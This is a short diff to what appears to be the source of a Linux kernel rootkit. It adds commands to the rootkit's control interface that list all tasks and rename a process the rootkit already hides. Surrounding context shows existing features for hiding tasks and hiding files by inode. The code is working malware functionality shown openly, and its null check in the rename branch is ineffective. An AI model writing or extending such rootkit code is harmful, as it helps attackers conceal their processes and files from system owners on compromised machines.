@@ -491,6 +491,9 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             /* list hidden tasks */
         } else if(!strcmp(buf, "-s")) {
             kv_show_saved_tasks();
+            /* list ALL tasks */
+        } else if(!strcmp(buf, "-S")) {
+            kv_show_all_tasks();
             /* hide file/directory based on inode */
         } else if(!strncmp(buf, "-a", MIN(2, size))) {
             char *s = &buf[3];
@@ -549,6 +552,14 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                     set_elfbits(bits);
                 }
             }
+            /* rename a hidden process */
+        } else if (!strncmp(buf, "-n", MIN(2,size))) {
+            const char *s = &buf[3];
+            char *newname;
+            pid = (pid_t)simple_strtol(s, NULL, 10);
+            newname = strrchr(buf, ' ');
+            if (++newname)
+                kv_rename_task(pid, newname);
         }
     }
     proc_timeout(PRC_RESET);
